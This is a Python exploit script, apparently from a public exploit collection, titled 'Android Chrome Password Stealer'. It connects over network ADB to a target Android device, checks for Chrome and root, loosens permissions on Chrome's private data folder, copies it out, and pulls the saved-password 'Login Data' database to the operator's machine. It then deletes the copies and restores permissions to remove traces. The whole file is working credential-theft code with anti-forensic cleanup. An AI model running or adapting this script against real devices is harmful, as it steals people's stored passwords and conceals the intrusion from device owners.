#!/usr/bin/env python

# Title : Android Chrome Password Stealer
# Author : Hitesh Karmur
# Date : 15/03/2021
# Vulneralbility : https://bugs.chromium.org/p/chromium/issues/detail?id=1129358 

# import required modules
from ppadb.client import Client
import time
import sys
import re
import os

def help():
    print("python3 adbstealer.py <target>")
    print("e.g. python3 adbstealer.py 0.0.0.0")
    sys.exit()


if len(sys.argv) < 2:
  help()

server = sys.argv[1]

# connect to local adb server
# connect to remote server
from ppadb.client import Client as AdbClient
client = AdbClient(host="127.0.0.1", port=5037)

# Disconnects all devices
client.remote_disconnect()

print("Connecting to device ......")
client.remote_connect(server, 5555)
device = client.device(server + ":5555")


def package_list(connection):
    while True:
        data = connection.read(1024)
        if not data:
            break
        print("Writing app package lists to packages.txt")
        f = open("packages.txt", 'a')
        f.writelines(str(data.decode("utf-8")) + '\n')
        f.close()

    connection.close()

device.shell("pm list packages", handler=package_list)

def check_vuln(file_name, string_to_search):
    with open(file_name, 'r') as read_obj:
        for line in read_obj:
            if string_to_search in line:
                return True
    return False

def exception_1():
    print("Google Chrome is not installed in device, exiting")
    # Removes packages.txt
    if os.path.exists("packages.txt"):
        os.remove("packages.txt")
    # Removes root.txt
    if os.path.exists("root.txt"):
        os.remove("root.txt")
    sys.exit(1)

if check_vuln("packages.txt", "chrome"):
    print("Google Chrome is installed in device, proceeding with exploit")
else:
    exception_1()
    
def check_root(connection):
    while True:
        data = connection.read(1024)
        if not data:
            break
        print("Writing to root.txt")
        f = open("root.txt", 'a')
        f.writelines(str(data.decode("utf-8")) + '\n')
        f.close()

    connection.close()

device.shell("su -h", handler=check_root)

def exception_2():
    print("Device is not rooted, exiting")
    # Removes packages.txt
    if os.path.exists("packages.txt"):
        os.remove("packages.txt")
    # Removes root.txt
    if os.path.exists("root.txt"):
        os.remove("root.txt")
    sys.exit(1)

if check_vuln("root.txt", "Usage:"):
    print("Device is rooted, proceeding with exploit")
elif check_vuln("root.txt", "usage:"):
    print("Device is rooted, proceeding with exploit")
else:
    exception_2()

device.shell("su -c chmod 777 /data/data/com.android.chrome")
time.sleep(3)
print("Successfully changed data directory to sdcard")

device.shell("su -c cp -r /data/data/com.android.chrome /sdcard")
time.sleep(10)
print("Retrieving Login Data")

device.pull("/sdcard/com.android.chrome/app_chrome/Default/Login Data", "Login Data")
time.sleep(10)
print("Successfully received Login Data, Stored in your current directory, Open it with SQLite database browser")

print("Removing traces....")
device.shell("rm -r /sdcard/com.android.chrome")
time.sleep(3)
device.shell("su -c chmod 700 data/data/com.android.chrome")
print("Exploit Sucessful")

# Disconnect all devices
client.remote_disconnect(server, 5555)

# Removes packages.txt
if os.path.exists("packages.txt"):
  os.remove("packages.txt")

# Removes root.txt
if os.path.exists("root.txt"):
  os.remove("root.txt")
